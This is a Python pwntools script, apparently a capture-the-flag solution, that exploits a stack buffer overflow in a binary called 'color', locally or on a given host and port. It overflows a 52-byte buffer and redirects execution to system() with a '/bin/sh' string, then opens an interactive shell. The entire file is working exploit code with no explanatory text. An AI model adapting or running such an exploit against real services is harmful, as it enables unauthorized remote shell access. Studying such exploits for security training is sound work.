#!/usr/bin/env python3

from pwn import context, ELF, p32, remote, sys

context.binary = elf = ELF('color')


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], int(sys.argv[2])
    return remote(host, port)


def main():
    p = get_process()

    offset = 52
    junk = b'A' * offset

    payload  = junk
    payload += p32(elf.plt.system)
    payload += p32(0)
    payload += p32(next(elf.search(b'/bin/sh')))

    p.sendlineafter(b'Enter your favorite color: ', payload)
    p.interactive()


if __name__ == '__main__':
    main()
